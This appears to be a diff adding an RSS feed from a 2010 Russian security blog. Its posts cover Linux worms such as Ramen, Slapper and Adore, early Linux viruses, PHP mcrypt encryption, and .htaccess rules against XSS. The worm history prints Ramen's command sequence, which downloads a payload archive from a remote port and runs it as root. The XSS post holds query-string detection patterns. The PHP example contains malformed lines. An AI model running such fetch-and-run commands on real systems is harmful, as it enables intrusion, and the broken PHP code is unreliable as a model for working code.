@@ -1,0 +1,655 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:slash="http://purl.org/rss/1.0/modules/slash/" xmlns:dc="http://purl.org/dc/elements/1.1/" version="2.0">
+  <channel>
+    <title>SecurOS :: безопасность, хакерство, секреты взлома</title>
+    <link>http://feeds.feedburner.com/securos/feed</link>
+    <description>Доступно про безопасность, защиту, сохранность данных, хакерство и взлом linux, windows. Антивирусные программы, фаерволы, антишпионы, кумулятивные обновления баз данных сигнатур популярных антивирусных средств. Статьи, обзоры, новости и многое другое.</description>
+    <item>
+      <title>“Черви” под Linux: хроника</title>
+      <link>http://feedproxy.google.com/~r/securos/feed/~3/0AyM-4HPQSk/</link>
+      <wfw:commentRss xmlns:wfw="http://wellformedweb.org/CommentAPI/">http://securos.org.ua/chervi-pod-linux-xronika/feed/</wfw:commentRss>
+      <feedburner:origLink xmlns:feedburner="http://rssnamespace.org/feedburner/ext/1.0">http://securos.org.ua/chervi-pod-linux-xronika/</feedburner:origLink>
+      <description>На мой взгляд, нужно быть мега крутым админом с 10-летним стажем работы с Unix-подобными системами в крупной фирме, чтоб столкнутся хотя бы с частью того списка вирусов, который нам продемонстрировал vad (к сожалению не знаю как зовут человека) в комментариях к посту &amp;#8220;И все же, существуют вирусы для linux?&amp;#8221;.
+Давайте рассмотрим некоторые вирусы, относящиеся к червям, представляющие [...]</description>
+      <category>Социальная инженерия</category>
+      <pubDate>Thu, 22 Jul 2010 22:44:15 GMT</pubDate>
+      <guid isPermaLink="false">http://securos.org.ua/?p=1894</guid>
+      <dc:creator>carerakjan</dc:creator>
+      <dc:date>2010-07-22T22:44:15Z</dc:date>
+      <content:encoded><![CDATA[<p style="text-align: center;"><img class="size-full wp-image-1896 aligncenter" title="worms_securos.org.ua" src="http://securos.org.ua/wp-content/uploads/2010/07/worms_securos.org_.ua_.jpg" alt="worms securos.org .ua  Черви под Linux: хроника" width="450" height="372" /></p>
+<p style="text-align: justify;">На мой взгляд, нужно быть мега крутым админом с 10-летним стажем работы с Unix-подобными системами в крупной фирме, чтоб столкнутся хотя бы с частью того списка вирусов, который нам продемонстрировал vad (к сожалению не знаю как зовут человека) в комментариях к посту <a href="http://securos.org.ua/i-vse-zhe-sushhestvuyut-virusy-dlya-linux/#comments" target="_blank">&#8220;И все же, существуют вирусы для linux?&#8221;</a>.</p>
+<p style="text-align: justify;">Давайте рассмотрим некоторые вирусы, относящиеся к червям, представляющие действительно серьезную угрозу, распространяясь по сети, используя уязвимые места программ электронной почты и других сетевых служб. Такие &#8220;червяки&#8221; реально могут причинить ущерб Linux-машине.</p>
+<h1 style="text-align: justify;"><span style="color: #888888;">&#8220;Червь&#8221; Ramen</span></h1>
+<p style="text-align: justify;">&#8220;Червь&#8221; Ramen, названный в честь блюда из макарон, популярного среди многих программистов, стал первым &#8220;червем&#8221;, поразившим Linux-системы.<br />
+Первые сообщения об обнаружении &#8220;червя&#8221; Ramen появились 17 января 2001 года. Среди наиболее значимых организаций, компьютеры которых были поражены &#8220;червем&#8221;, можно назвать Техасский университет А&#38;М, лабораторию НАСА по исследованию реактивного движения и Supermicro — тайваньскую фирму-производителя аппаратных средств. Ramen был составлен из нескольких ранее известных сценариев атаки, одновременно упрощая и увеличивая их в объеме. В результате получилось чрезвычайно эффективное средство. Целью атаки были серверы под управлением операционных систем Red Hat Linux, хотя нет причин, по которым бы &#8220;червь&#8221; не мог поражать другие системы, для этого создателю нужно было только потратить еще немного времени. Рассмотрим процесс заражения компьютеров.</p>
+<ol style="text-align: justify;">
+<li style="text-align: justify;">Ramen пытается подключиться к порту 21 (FTP) атакуемого хоста. При этом используется программа SYN-сканирования Synscan, и по идентификационным маркерам, выдаваемым FTP-сервером, делается предположение об используемой версии Red Hat. Именно эта проверка, идентифицирующая уязвимую версию, вероятно, послужила причиной, по которой Ramen поражает только системы Red Hat.</li>
+<li>Если Ramen определяет, что на компьютере запущена версия Red Hat 6.2, то выполняется атака на демоны wu-ftpd и rpc.statd. Если запущена версия Red Hat 7.0, то будет атакован LPRng-сервер (lpd). В случае успеха одной из атак на взломанном хосте выполняется следующая последовательность команд от имени суперпользователя.                                                                                                                                                                                     <div class='stb-grey_box' >mkdir /usr/src/.poop;cd /usr/src/.poop<br />
+export TERM=vt100<br />
+lynx -source http://IP_ADDR:27374   &#62;  /usr/src/.poop/ramen.tgz<br />
+cp ramen.tgz  /tmp<br />
+gzip -d ramen.tgz;tar -xvf  ramen.tar; ./start.sh<br />
+echo Eat Your Ramen!    I mail  emailaddress</div></li>
+<li>Указанный адрес IP_ADDR для команды lynx является IP-адресом атакуемого компьютера. Вместо emailaddress используется адрес электронной почты на почтовом сервере Hotmail.</li>
+<li>С помощью изменения настроек для демона inetd (для Red Hat 7.0 — демона xinetd) сценарий start.sh запускает на порту 27374 небольшой НТТР-сервар (НТТР/0.9), через который в дальнейшем (при запросах к порту) будут распространяться копии &#8220;червя&#8221; (вышеприведенная команда lynx позволяет установить соединение с атакующим сервером через порт 27374 и сохранить всю информацию в файл /usr/src/.poop/ramen. tgz).</li>
+<li>В зависимости от версии Red Hat, с инфицированного компьютера удаляются демоны rpc.statd или lpd.</li>
+<li>В файл /etc/ftpusers добавляются две записи: anonymous и ftp.</li>
+<li style="text-align: justify;">Затем &#8220;червь&#8221; заменяет все файлы с именем index. html на HTML-код, позволяющий вывести на монитор следующее сообщение: &#8220;Hackers looooooooooooooooove noodles&#8221;.</li>
+</ol>
+<p style="text-align: justify;">Чем же все-таки вызван интерес к Ramen?</p>
+<ul style="text-align: justify;">
+<li>Ramen был не написан, а скорее составлен из разных частей уже существовавшего кода. За исключением HTTP-сервера и механизма запуска, все остальные программы атаки взяты из других источников.</li>
+<li>Он не пытается передать управление компьютером в руки хакера. Действительно, после замены страниц index. html практически гарантируется, что администраторы узнают о взломе системы.</li>
+<li>Ramen пытается исправить обнаруженные недостатки системы безопасности. Он отключает анонимный FTP с помощью добавления записей в файл /etc/ftpusers и удаляет уязвимые программы rpc. statdu lpd с любой инфицированной им машины.</li>
+<li>Удаление уязвимых мест дополнительно позволяет избежать повторных атак на эту же систему.</li>
+<li>Информация об инфицированных машинах отправлялась на один почтовый адрес Hotmail (хотя этот адрес очень скоро прекратил свое существование).</li>
+<li>&#8220;Червь&#8221; распространялся самостоятельно с помощью Web-сервера, создаваемого на атакованном компьютере. Если бы он зависел от центрального Web-сервера в Internet, то провайдер быстро бы отключил этот Web-сервер и тем самым прекратил бы распространение &#8220;червя&#8221;. Ramen не нуждается в выделенном внешнем компьютере.</li>
+<li>Порт 27374 использовался троянской программой Subseven, предназначенной для атаки Windows-систем и неприменимой против Linux-машин. Использование именно этого порта довольно примечательно. Возможно, что это сделано специально, как еще одна подсказка для выявления &#8220;червя&#8221; системой обнаружения вторжений, и свидетельствует об относительной доброжелательности создателя Ramen.</li>
+<li>Для замены Web-страниц index.html изображением странички Ramen был использован стандартный дескриптор HTML. Каждый раз при подключении пользователя к Web-серверу скомпрометированного компьютера это изображение загружалось с сервера производителя макарон Top Ramen — фирмы Nissin Foods. Это означает, что фирма Nissin потенциально может располагать списком взломанных узлов, определенных по заголовкам Referrer: в HTTP-запросах.</li>
+</ul>
+<p style="text-align: justify;">Ramen был довольно эффективным &#8220;червем&#8221;, и тревога по поводу его появления была поднята практически незамедлительно. Однако используемые им уязвимые месте были уже известны, и заплаты существовали довольно давно. Единственной причиной, позволившей вирусу распространиться, было отсутствие на серверах установленных заплат для систем Red Hat, которые на момент появления &#8220;червя&#8221; были выпущены от трех до восьми месяцев назад.</p>
+<h1 style="text-align: justify;"><span style="color: #888888;">LiOn</span></h1>
+<p style="text-align: justify;"><span style="color: #000000;">Появление Ramen стало толчком для возобновления интереса к &#8216;&#8221;червям&#8221; для UNIX-систем. К сожалению, эта заинтересованность прежде всего появилась у недоброжелательных пользователей. Следующим &#8220;червем&#8221; стал LiOn. Этот &#8220;червь&#8221; был предназначен для атаки на сервары имен BIND от версии 8.2 до 8.2.3, в которых присутствовала ошибка при обработке TSIG-запросов (Transaction Signatures). После компрометации одного компьютера &#8216;&#8221;червь&#8221; c целью своего распространения начинает атаковать случайные компьютеры сети Internet.</span></p>
+<p style="text-align: justify;"><span style="color: #000000;">На локальном компьютере &#8220;червь&#8221; LiOn устанавливает набор средств для взлома t0rn, предоставляющий хакеру (который знает пароль) различные возможности компрометации учетной записи root, а также устанавливает троянские версии нескольких локальных программ для выдачи системной информации, например ls и netstat. С помощью суперсервера inetd командные интерпретаторы с правами root становятся доступными по сети через порты 60008 и 33567. Несколько копий командных интерпретаторов с установленным битом SUID root сохраняются в локальной файловой системе. Копии файлов /etc/passwd и /etc/shadow отправляются на удаленный адрес электронной почты.</span></p>
+<h1 style="text-align: justify;"><span style="color: #808080;">Adore</span></h1>
+<p style="text-align: justify;"><span style="color: #000000;">После LiOn настала пора &#8220;червя&#8221; Adore, который использовал уязвимые места, эксплуатируемые двумя более ранними &#8220;червями&#8221; (Ramen и LiOn), а именно: LPRng, rpc-statd, wu-f tp и BIND. В то время как в LiOn находили различные троянские версии двоичных файлов (из набора torn), &#8220;&#8221;червь&#8221; Adore подменяет только одну утилиту ps. Предпринимается попытка отправить определенный объем системной информации, например, сведения о конфигурации сети, теневые пароли и файл суперпользователя .bash_history по различным адресам электронной почты. Adore добавляет новые учетные записи с правами, эквивалентными правам root, и устанавливает копии командного интерпретатора с SUID root для обеспечения хакеру возможности привилегированного доступа к этой системе. Затем распаковываются сценарии атаки и начинается поиск других компьютеров, доступных для атаки.</span></p>
+<p style="text-align: justify;"><span style="color: #000000;">LiOn и Adore являются вредоносными &#8220;червями&#8221;. &#8220;Червь&#8221; Ramen имеет некоторые положительные черты— хотя он и незаконно проникает на чужие компьютеры и изменяет обнаруженные Web-документы, но одновременно он старается закрыть использованные им же бреши в системе защиты.</span></p>
+<h1 style="text-align: justify;"><span style="color: #000000;"><span style="color: #808080;">Cheese</span></span></h1>
+<p style="text-align: justify;"><span style="color: #000000;">&#8220;Червь&#8221; Cheese является наиболее &#8220;полезным&#8221;. Он выполняет поиск компьютеров, в которых командные интерпретаторы с правами root доступны через порт 10008. Существуют программы атаки на сервер BIND (ошибка при обработке TSIG-запросов), которые оставляют этот порт открытым для несанкционированного доступа хакера. Cheese выявляет такие компьютеры, устанавливается в их системы и устраняет проблему. При этом в сам пакет BIND не вносятся исправления, а просто редактируется файл /etc/inetd.conf, из него удаляются все строки, содержащие /bin/sh. После этого перезапускается демон inetd.</span></p>
+<p style="text-align: justify;">Несмотря на пользу от действий Cheese, создание &#8220;червя&#8221; для исправления ошибок на чужих компьютерах является не лучшим методом. &#8220;Червь&#8221; вызывает увеличение потока сетевого трафика при своих попытках распространения, он не устраняет источник проблемы — ошибку в пакете BIND, и ничему не учит ленивых системных администраторов. Подумайте дважды, прежде чем создавать собственный &#8220;благородный червь&#8221; :].</p>
+<h1 style="text-align: justify;"><span style="color: #808080;">Slapper</span></h1>
+<p style="text-align: justify;">Существует несколько вариантов и несколько названий &#8220;червя&#8221; Slapper, например Modap, Cinik и Unlock. Все они практически идентичны и используют уязвимое место в Web-серверах Apache с поддержкой SSL. Ошибка присутствовала в OpenSSL версии 0.9.6d и более ранних, до выхода SSL версии 2. Основным методом обеспечения поддержки на сервере Apache протокола SSL является использование модуля mod_ssl или Apache-SSL (http: //www.apache-ssl. org/) — версии Apache со встроенной поддержкой SSL. В обоих случая должны применяться библиотеки OpenSSL, то есть проблема не в самом сервере Apeche, а в программном обеспечении для поддержки возможностей SSL.</p>
+<p style="text-align: justify;">&#8220;Червь&#8221; Slapper поражает серверы Apache, на которых используются устаревшие SSL-библиотеки, и способен предоставить доступ с правами пользователя Web-сервера (как правило, это httpd, www-data или nobody) и не предоставляет немедленного доступа с привилегиями root. Slapper устанавливает файл пол названием /tmp/.bugtraq.c, компилирует и запускает его. Вместо создания доступной по сети копии командного интерпретатора, он создает сеть типа &#8220;точка-точка&#8221;, состоящую из инфицированных компьютеров. Все компьютеры этой сети поддерживают взаимосвязь друг с другом через UDP-порт 2002. В эту сеть хакер может передавать свои команды, которые будут выполнены на всех инфицированных компьютерах. Некоторые из этих команд способны организовать атаку отказа в обслуживании (ТСР-наводнения или наводнения UDP-пакетами с использованием службы DNS). Это позволяет хакеру получить непосредственный доступ к компьютерам и, возможно, расширить свои привилегии до уровня root.</p>
+<p style="text-align: justify;">Хотя и сложно точно определить количество &#8220;инфицированных&#8221; хостов, но очевидно, что Slapper стал одним иэ наиболее удачных &#8220;червей&#8221; для Linux-систем. В оценках различных организаций присутствуют значения от 10000 до 40000 хостов. Для Linux-&#8221;червя&#8221; это много. Но по сравнению с &#8220;червем&#8221; Code Red, поразившем более 400000 Windows-систем, атаки с помощью &#8220;червей&#8221; Linux выглядят довольно безобидными :].</p>
+<p style="text-align: justify;">Как итог, можно сказать следующее. Описанные в посте &#8220;черви&#8221; в настоящее время практически неактивны. Для их распространения требуется устаревшее программное обеспечение, в котором бы присутствовали ошибки. Если проводить своевременное обновление программ на своей системе и устанавливать последние заплаты защиты, появление нового &#8220;червя&#8221; не будет представлять реальной угрозы.</p>
+<p style="text-align: justify;">
+<p style="text-align: justify;"><span style="color: #000000;"></p>
+<p></span></p>
+<p style="text-align: justify;">
+<p style="text-align: justify;">
+<p style="text-align: justify;">
+<p style="text-align: justify;">
+<hr/>Copyright &#169; 2010 <strong><a href="http://securos.org.ua">SecurOS :: безопасность, хакерство, секреты взлома</a></strong>. This Feed is for personal non-commercial use only. If you are not reading this material in your news aggregator, the site you are looking at is guilty of copyright infringement. Please contact legal@securos.org.ua so we can take legal action immediately.<br/><span style="float: right;font-size: 7pt"><a href="http://blog.taragana.com/index.php/archive/wordpress-plugins-provided-by-taraganacom/">Plugin</a> by <a href="http://www.taragana.com/">Taragana</a></span>
+<p><a href="http://feedads.g.doubleclick.net/~a/9A5YLrLDcOca4gzigLxJ1ltwP7E/0/da"><img src="http://feedads.g.doubleclick.net/~a/9A5YLrLDcOca4gzigLxJ1ltwP7E/0/di" border="0" ismap="true"></img></a><br/>
+<a href="http://feedads.g.doubleclick.net/~a/9A5YLrLDcOca4gzigLxJ1ltwP7E/1/da"><img src="http://feedads.g.doubleclick.net/~a/9A5YLrLDcOca4gzigLxJ1ltwP7E/1/di" border="0" ismap="true"></img></a></p><div class="feedflare">
+<a href="http://feeds.feedburner.com/~ff/securos/feed?a=0AyM-4HPQSk:qbEt5lzWu3M:yIl2AUoC8zA"><img src="http://feeds.feedburner.com/~ff/securos/feed?d=yIl2AUoC8zA" border="0"></img></a>
+</div><img src="http://feeds.feedburner.com/~r/securos/feed/~4/0AyM-4HPQSk" height="1" width="1"/>]]></content:encoded>
+      <slash:comments>8</slash:comments>
+    </item>
+    <item>
+      <title>И все же, существуют вирусы для linux?</title>
+      <link>http://feedproxy.google.com/~r/securos/feed/~3/ffJke1jBchs/</link>
+      <wfw:commentRss xmlns:wfw="http://wellformedweb.org/CommentAPI/">http://securos.org.ua/i-vse-zhe-sushhestvuyut-virusy-dlya-linux/feed/</wfw:commentRss>
+      <feedburner:origLink xmlns:feedburner="http://rssnamespace.org/feedburner/ext/1.0">http://securos.org.ua/i-vse-zhe-sushhestvuyut-virusy-dlya-linux/</feedburner:origLink>
+      <description>Самостоятельно на такие вопросы я бы ответить не осмелился, хотя и не исключаю такой возможности, это большая ответственность, да и за слова отвечать надо. Поэтому, я обратился к первоисточнику и выискал вот какую информацию.
+Для доказательства потенциальной возможности было создано несколько вирусов для Linux. Однако они могли распространяться только при запуске зараженного файла от имени суперпользователя [...]</description>
+      <category>Социальная инженерия</category>
+      <pubDate>Tue, 20 Jul 2010 18:17:13 GMT</pubDate>
+      <guid isPermaLink="false">http://securos.org.ua/?p=1879</guid>
+      <dc:creator>carerakjan</dc:creator>
+      <dc:date>2010-07-20T18:17:13Z</dc:date>
+      <content:encoded><![CDATA[<p style="text-align: center;"><a href="http://securos.org.ua/wp-content/uploads/2010/07/virus_linux_securos.org_.ua_.jpeg"><img class="size-full wp-image-1880 aligncenter" title="virus_linux_securos.org.ua" src="http://securos.org.ua/wp-content/uploads/2010/07/virus_linux_securos.org_.ua_.jpeg" alt=" И все же, существуют вирусы для linux?" width="450" height="338" /></a></p>
+<p style="text-align: justify;">Самостоятельно на такие вопросы я бы ответить не осмелился, хотя и не исключаю такой возможности, это большая ответственность, да и за слова отвечать надо. Поэтому, я обратился к первоисточнику и выискал вот какую информацию.</p>
+<p style="text-align: justify;">Для доказательства потенциальной возможности было создано несколько вирусов для Linux. Однако они могли распространяться только при запуске зараженного файла от имени суперпользователя и могли поражать только локальные (или доступные с помощью NFS) двоичные файлы.<br />
+Операционная система Linux, как и другие UNIX-подобные операционные системы, не уязвима для вирусных атак, опасных для однопользовательских систем. Возможно, что UNIX-вирусы будут созданы в будущем или даже в ближайшее время, но сейчас реально серьезных угроз просто не существует. Ниже кратко рассмотрены результаты нескольких попыток создания вирусов для UNIX-подобных систем.</p>
+<h1 style="text-align: justify;"><span style="color: #888888;">Bliss</span></h1>
+<p style="text-align: justify;">Вирус Bliss был создан в начаяе 1997 года. Хотя его создатели и называют его вирусом, но точнее его было бы называть трояном. При загрузке пользователем кода Bliss и его запуске он находит исполняемые файлы, к которым этот пользователь имеет доступ, и модифицирует их, добаваяя свой код. При запуске модифицированной версии исполняемого файла код Bliss извлекается в файл /tmp/.bliss-tmp.pid и запускается. Пользователь не может заметить никаких изменений, так как двоичный файл выполняется независимо от последующего запуска кода троянской программы.</p>
+<h1 style="text-align: justify;"><span style="color: #888888;">W32/Lindose</span></h1>
+<p style="text-align: justify;">Межплатформенный вирус W32/Lindose способен поражать исполняемые РЕ-файлы (Portable Executable— формат загружаемого кода) Windows и исполняемые ELF-файлы Linux. При его запуске он находит указанные исполняемые файлы и добавляет к ним свой код. Безусловно, это можно назвать успешным вирусом, но только с технической точки зрения. Для пользователей Linux особой угрозы нет. Программа вируса может запускаться только на компьютерах под управлением Windows, то есть для успешной работы вируса требуется наличие смонтированных файловых систем Linux на Windows-хосте.</p>
+<p style="text-align: justify;">А уж если верить поставщикам антивирусного ПО, то существует гораздо больше вирус под Linux. Но мы, почему-то ничего про них не знаем и тем более не сталкивались.</p>
+<p style="text-align: justify;">
+<hr/>Copyright &#169; 2010 <strong><a href="http://securos.org.ua">SecurOS :: безопасность, хакерство, секреты взлома</a></strong>. This Feed is for personal non-commercial use only. If you are not reading this material in your news aggregator, the site you are looking at is guilty of copyright infringement. Please contact legal@securos.org.ua so we can take legal action immediately.<br/><span style="float: right;font-size: 7pt"><a href="http://blog.taragana.com/index.php/archive/wordpress-plugins-provided-by-taraganacom/">Plugin</a> by <a href="http://www.taragana.com/">Taragana</a></span>
+<p><a href="http://feedads.g.doubleclick.net/~a/ZWr1pbpJygzt4X1Up71mzOr7PmY/0/da"><img src="http://feedads.g.doubleclick.net/~a/ZWr1pbpJygzt4X1Up71mzOr7PmY/0/di" border="0" ismap="true"></img></a><br/>
+<a href="http://feedads.g.doubleclick.net/~a/ZWr1pbpJygzt4X1Up71mzOr7PmY/1/da"><img src="http://feedads.g.doubleclick.net/~a/ZWr1pbpJygzt4X1Up71mzOr7PmY/1/di" border="0" ismap="true"></img></a></p><div class="feedflare">
+<a href="http://feeds.feedburner.com/~ff/securos/feed?a=ffJke1jBchs:yL_i0d8TI00:yIl2AUoC8zA"><img src="http://feeds.feedburner.com/~ff/securos/feed?d=yIl2AUoC8zA" border="0"></img></a>
+</div><img src="http://feeds.feedburner.com/~r/securos/feed/~4/ffJke1jBchs" height="1" width="1"/>]]></content:encoded>
+      <slash:comments>12</slash:comments>
+    </item>
+    <item>
+      <title>Шифрование строки на PHP</title>
+      <link>http://feedproxy.google.com/~r/securos/feed/~3/2_VfNiN3T-g/</link>
+      <wfw:commentRss xmlns:wfw="http://wellformedweb.org/CommentAPI/">http://securos.org.ua/shifrovanie-stroki-na-php/feed/</wfw:commentRss>
+      <feedburner:origLink xmlns:feedburner="http://rssnamespace.org/feedburner/ext/1.0">http://securos.org.ua/shifrovanie-stroki-na-php/</feedburner:origLink>
+      <description>Mcrypt – это очень полезная функция PHP, у которой есть много алгоритмов шифрования. С ее помощью возникает возможность зашифровать и расшифровать данные – это называется двухстороннее шифрование. Для начала необходимо понять как данные могут быть зашифрованы и затем, с помощью расширения Mcrypt расшифрованы и тем самым приведены к первоначальному виду.
+Ниже приведен код, демонстрирующий выше упомянутые [...]</description>
+      <category>Безопасность скриптов</category>
+      <pubDate>Mon, 12 Jul 2010 06:32:05 GMT</pubDate>
+      <guid isPermaLink="false">http://securos.org.ua/?p=1731</guid>
+      <dc:creator>carerakjan</dc:creator>
+      <dc:date>2010-07-12T06:32:05Z</dc:date>
+      <content:encoded><![CDATA[<p style="text-align: center;"><img class="size-full wp-image-1736 aligncenter" title="mcrypt_php_securos.org.ua" src="http://securos.org.ua/wp-content/uploads/2010/06/mcrypt_php_securos.org_.ua_.gif" alt="mcrypt php securos.org .ua  Шифрование строки на PHP" width="432" height="288" /></p>
+<p style="text-align: justify;">Mcrypt – это очень полезная функция PHP, у которой есть много алгоритмов шифрования. С ее помощью возникает возможность зашифровать и расшифровать данные – это называется <strong>двухстороннее шифрование</strong>. Для начала необходимо понять как данные могут быть зашифрованы и затем, с помощью расширения Mcrypt расшифрованы и тем самым приведены к первоначальному виду.</p>
+<p style="text-align: justify;">Ниже приведен код, демонстрирующий выше упомянутые действия, изначально шифруется последовательность, используя ключ шифрования, затем зашифрованные данные показываются в браузере, ну и далее последовательность расшифровывается, используя тот же самый ключ (немного примитивно, но все же).</p>
+<p style="text-align: justify;">Mcrypt версии 2.4.7 поддерживает следующие алгоритмы шифрования: Blowfish, RC2, Safer-sk64 xtea, Cast-256, RC4, Safer-sk128, DES, RC4-iv, Serpent, Enigma, Rijndael-128, Threeway, Rijndael-192, TripleDES, LOKI97, Rijndael-256, Twofish, Panama, Saferplus и т.д.</p>
+
+<div class="wp_syntax"><div class="code"><pre class="php" style="font-family:monospace;"><span style="color: #339933;">&#60;</span> ? php
+<span style="color: #000088;">$string</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">&#34;Это - последовательность, которая будет зашифрована&#34;</span><span style="color: #339933;">;</span>
+<span style="color: #000088;">$key</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">&#34;Это - ключ&#34;</span><span style="color: #339933;">;</span>
+<span style="color: #666666; font-style: italic;">//Алгоритм Шифрования</span>
+<span style="color: #000088;">$alg</span> <span style="color: #339933;">=</span> MCRYPT_RIJNDAEL_256<span style="color: #339933;">;</span>
+<span style="color: #666666; font-style: italic;">//Создание вектора инициализации для дополнительной безопасности</span>
+<span style="color: #000088;">$iv</span> <span style="color: #339933;">=</span> <span style="color: #990000;">mcrypt_create_iv</span> <span style="color: #009900;">&#40;</span><span style="color: #990000;">mcrypt_get_iv_size</span> <span style="color: #009900;">&#40;</span><span style="color: #000088;">$alg</span><span style="color: #339933;">,</span> MCRYPT_MODE_ECB<span style="color: #009900;">&#41;</span><span style="color: #339933;">,</span> MCRYPT_RAND<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #666666; font-style: italic;">//Наша строка</span>
+<span style="color: #b1b100;">print</span> <span style="color: #0000ff;">&#34;Original string: <span style="color: #006699; font-weight: bold;">$string</span> &#60;p&#62;&#34;</span><span style="color: #339933;">;</span>
+<span style="color: #666666; font-style: italic;">//Шифрование</span>
+<span style="color: #000088;">$string</span> <span style="color: #000088;">$encrypted_string</span> <span style="color: #339933;">=</span> <span style="color: #990000;">mcrypt_encrypt</span> <span style="color: #009900;">&#40;</span><span style="color: #000088;">$alg</span><span style="color: #339933;">,</span> <span style="color: #000088;">$key</span><span style="color: #339933;">,</span> <span style="color: #000088;">$string</span><span style="color: #339933;">,</span> MCRYPT_MODE_CBC<span style="color: #339933;">,</span> <span style="color: #000088;">$iv</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #666666; font-style: italic;">//Преобразованная в шестнадцатиричный вид строка</span>
+<span style="color: #b1b100;">print</span> <span style="color: #0000ff;">&#34;Encrypted string: &#34;</span><span style="color: #339933;">.</span><span style="color: #990000;">bin2hex</span><span style="color: #009900;">&#40;</span><span style="color: #000088;">$encrypted_string</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">.</span><span style="color: #0000ff;">&#34;&#60;p&#62;&#34;</span><span style="color: #339933;">;</span>
+<span style="color: #000088;">$decrypted_string</span> <span style="color: #339933;">=</span> <span style="color: #990000;">mcrypt_decrypt</span> <span style="color: #009900;">&#40;</span><span style="color: #000088;">$alg</span><span style="color: #339933;">,</span> <span style="color: #000088;">$key</span><span style="color: #339933;">,</span> <span style="color: #000088;">$encrypted_string</span><span style="color: #339933;">,</span> MCRYPT_MODE_CBC<span style="color: #339933;">,</span> <span style="color: #000088;">$iv</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #b1b100;">print</span> <span style="color: #0000ff;">&#34;Decrypted string: <span style="color: #006699; font-weight: bold;">$decrypted_string</span>&#34;</span><span style="color: #339933;">;</span>
+<span style="color: #000000; font-weight: bold;">?&#62;</span>
+<span style="color: #339933;">&#60;/</span>p<span style="color: #339933;">&#62;</span></pre></div></div>
+
+<p style="text-align: justify;">По установке библиотеки  <a title="mcrypt" href="http://www.php.net/manual/en/mcrypt.setup.php" target="_blank"><strong>Mcrypt</strong></a> можно почитать на официальном сайте PHP. При наличии серверного мульти-пакета WAMP (PHP 5, Apache, MySQL), необходимости установки mcrypt нет, только включить и все.</p>
+<p style="text-align: justify;">Чтобы узнать какой алгоритм mcrypt поддерживается в операционной системе, используется <strong>mcrypt_list_algorithms ()</strong>, алгоритм является первым аргументом в mcrypt_encrypt / mcrypt_dencrypt функциях.</p>
+<p style="text-align: justify;">Четвертым аргументом в mcrypt_encrypt / mcrypt_dencrypt является <strong>MCRYPT_MODE_CBC</strong> способ для шифрования или декодирования – чтобы вернуть список поддержанных способов используется <strong>mcrypt_list_modes ()</strong>.</p>
+<p style="text-align: justify;">Источник инфо: http://php-mysql.develop.sitefrost.com/blog/2010/02/13/two-way-encryption/</p>
+<p style="text-align: justify;">
+<p style="text-align: justify;">
+<hr/>Copyright &#169; 2010 <strong><a href="http://securos.org.ua">SecurOS :: безопасность, хакерство, секреты взлома</a></strong>. This Feed is for personal non-commercial use only. If you are not reading this material in your news aggregator, the site you are looking at is guilty of copyright infringement. Please contact legal@securos.org.ua so we can take legal action immediately.<br/><span style="float: right;font-size: 7pt"><a href="http://blog.taragana.com/index.php/archive/wordpress-plugins-provided-by-taraganacom/">Plugin</a> by <a href="http://www.taragana.com/">Taragana</a></span>
+<p><a href="http://feedads.g.doubleclick.net/~a/C38csSZTQNroHfOpSa6-Ze_b1pA/0/da"><img src="http://feedads.g.doubleclick.net/~a/C38csSZTQNroHfOpSa6-Ze_b1pA/0/di" border="0" ismap="true"></img></a><br/>
+<a href="http://feedads.g.doubleclick.net/~a/C38csSZTQNroHfOpSa6-Ze_b1pA/1/da"><img src="http://feedads.g.doubleclick.net/~a/C38csSZTQNroHfOpSa6-Ze_b1pA/1/di" border="0" ismap="true"></img></a></p><div class="feedflare">
+<a href="http://feeds.feedburner.com/~ff/securos/feed?a=2_VfNiN3T-g:FfX7KYI9UPI:yIl2AUoC8zA"><img src="http://feeds.feedburner.com/~ff/securos/feed?d=yIl2AUoC8zA" border="0"></img></a>
+</div><img src="http://feeds.feedburner.com/~r/securos/feed/~4/2_VfNiN3T-g" height="1" width="1"/>]]></content:encoded>
+      <slash:comments>16</slash:comments>
+    </item>
+    <item>
+      <title>Защита WordPress от XSS</title>
+      <link>http://feedproxy.google.com/~r/securos/feed/~3/NNPC8DvCcS4/</link>
+      <wfw:commentRss xmlns:wfw="http://wellformedweb.org/CommentAPI/">http://securos.org.ua/zashhita-wordpress-ot-xss/feed/</wfw:commentRss>
+      <feedburner:origLink xmlns:feedburner="http://rssnamespace.org/feedburner/ext/1.0">http://securos.org.ua/zashhita-wordpress-ot-xss/</feedburner:origLink>
+      <description>Задача данного метода &amp;#8211; защитить переменные GLOBALS и _REQUEST от несанкционированной модификации. Для этого мы будем использовать файл .htaccess, который находиться в корне сайта. Перед тем, как вносить изменения, обязательно сделайте резервную копию этого файла. После чего откройте любой текстовый редактор и вставьте следующее:
+
+Options +FollowSymLinks
+RewriteEngine On
+RewriteCond %{QUERY_STRING} (\&amp;#60;&amp;#124;%3C).*script.*(\&amp;#62;&amp;#124;%3E) [NC,OR]
+RewriteCond %{QUERY_STRING} GLOBALS(=&amp;#124;\[&amp;#124;\%[0-9A-Z]{0,2}) [OR]
+RewriteCond %{QUERY_STRING} _REQUEST(=&amp;#124;\[&amp;#124;\%[0-9A-Z]{0,2})
+RewriteRule ^(.*)$ [...]</description>
+      <category>Безопасность скриптов</category>
+      <pubDate>Fri, 09 Jul 2010 22:37:57 GMT</pubDate>
+      <guid isPermaLink="false">http://securos.org.ua/?p=1807</guid>
+      <dc:creator>carerakjan</dc:creator>
+      <dc:date>2010-07-09T22:37:57Z</dc:date>
+      <content:encoded><![CDATA[<p><img class="alignleft size-full wp-image-1809" title="xss_wordpress_securos.org.ua" src="http://securos.org.ua/wp-content/uploads/2010/07/xss_wordpress_securos.org_.ua_.jpg" alt="xss wordpress securos.org .ua  Защита WordPress от XSS" width="446" height="263" /></p>
